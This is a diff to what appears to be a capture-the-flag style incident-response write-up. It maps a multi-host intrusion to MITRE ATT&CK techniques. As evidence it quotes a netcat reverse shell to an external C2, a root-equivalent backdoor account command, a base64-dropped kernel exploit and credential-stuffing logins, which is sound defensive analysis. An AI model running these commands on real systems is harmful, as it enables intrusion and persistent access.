@@ -6,17 +6,21 @@
 ## Complete Attack Chain
 
 ```
-192.168.8.103 (Attacker)
-    |
-    | T1190 — Apache Struts OGNL injection (07:05)
-    | POST /frothlyinventory/integration/saveGangster.action
-    | payload: (#cmd='cat /etc/passwd')
-    v
-HOTH (192.168.9.30) — Apache Struts Server
+192.168.8.103 (Attacker 1)          192.168.8.112 (Attacker 2)
+    |                                      |
+    | T1190 — Apache Struts (07:05)        | T1110 — SugarCRM credential stuffing
+    |                                      | user=abugnst / pass=ilovedavsbasement
+    v                                      v
+HOTH (192.168.9.30)               HOTH + ABUNGST-L (07:24:24)
     |
     | T1136.001 — Linux backdoor account created
     |   useradd -ou tomcat7 -p ilovedaviderve
     |   → UID=0 GID=0 (root disguised as tomcat7)
+    |
+    | T1068 — Linux kernel privilege escalation
+    |   echo [base64] >> /tmp/colonel (07:08)
+    |   base64 --decode /tmp/colonel > /tmp/colonel.c
+    |   colonel.c = Ubuntu 16.04 BPF verifier exploit
     |
     | T1046 — Port scan from HOTH toward itself
     |   ports: 21,22,23,80,135,139,443,445,3389
@@ -24,7 +28,7 @@ HOTH (192.168.9.30) — Apache Struts Server
     | T1071.001 — Reverse shell established
     |   nc 45.77.53.176:8088 via /tmp/backpipe
     |
-    | T1539 — SugarCRM session cookie stolen (hypothesis)
+    | T1539 — SugarCRM session cookie stolen (CONFIRMED)
     |   PHPSESSID=ck2dbgeimem4h653tr1fbubf04
     v
 45.77.53.176 (External C2)
@@ -62,6 +66,8 @@ FYODOR-L (192.168.70.186) — Windows Workstation
     |            → 192.168.8.116
     v
 ABUNGST-L (192.168.24.128)
+    | Compromised via T1110 — SugarCRM credential stuffing
+    | by 192.168.8.112 at 07:24:24
     |
     | T1071.001 — C2 communication
     |   45.77.53.176:443 (1071 connections)
@@ -76,6 +82,7 @@ ABUNGST-L (192.168.24.128)
 | Phase | ID | Technique | Host | Evidence |
 |-------|----|-----------|------|----------|
 | Initial Access | T1190 | Exploit Public-Facing App | HOTH | 15 POST saveGangster.action |
+| Initial Access | T1110 | Credential Stuffing SugarCRM | ABUNGST-L | user=abugnst stream:http |
 | Execution | T1059.004 | Unix Shell | HOTH | cat /etc/passwd, sudo bash |
 | Execution | T1059.001 | PowerShell obfuscated | FYODOR-L | EventCode 4688 -enc |
 | Defense Evasion | T1027 | Obfuscated Files Base64+RC4 | FYODOR-L | Decoded payload |
@@ -87,7 +94,9 @@ ABUNGST-L (192.168.24.128)
 | Persistence | T1098 | Account Manipulation | FYODOR-L | EventCode 4732 |
 | Privilege Escalation | T1548.002 | UAC Bypass Fodhelper | FYODOR-L | Registry + fodhelper |
 | Privilege Escalation | T1134 | Access Token Manipulation | FYODOR-L | EventCode 4672/4673 |
+| Privilege Escalation | T1068 | Kernel BPF Exploit colonel.c | HOTH | osquery + stream:http |
 | Credential Access | T1539 | Steal Web Session Cookie | HOTH | PHPSESSID stolen |
+| Credential Access | T1078 | Valid Accounts SugarCRM | ABUNGST-L | Successful POST login |
 | Discovery | T1046 | Network Service Scanning | HOTH | Port scan 21-3389 |
 | Discovery | T1082 | System Information | FYODOR-L | WMIC 536 detections |
 | Discovery | T1049 | Network Connections | FYODOR-L | Netstat 78 detections |
@@ -96,7 +105,7 @@ ABUNGST-L (192.168.24.128)
 | C2 | T1071.001 | Web Protocols HTTP/S | All | 45.77.53.176 |
 | Lateral Movement | T1021.002 | SMB | FYODOR-L | Port 139 scanning |
 
-**Total : 20 MITRE ATT&CK techniques across 8 tactics**
+Total : 23 MITRE ATT&CK techniques across 9 tactics
 
 ---
 
@@ -114,4 +123,7 @@ ABUNGST-L (192.168.24.128)
 | Affected hosts | HOTH, FYODOR-L, ABUNGST-L | Network logs |
 | Port 1337 | Listening on HOTH | osquery ListeningPorts |
 | Tool download | logos.png | 45.77.53.176:3333 |
+| 2nd attacker IP | 192.168.8.112 | stream:http SugarCRM logs |
+| Credential stuffing | abugnst/ilovedavsbasement | POST /suitecrm/index.php |
+| Linux kernel exploit | colonel.c BPF verifier | base64 payload in OGNL |
 ```
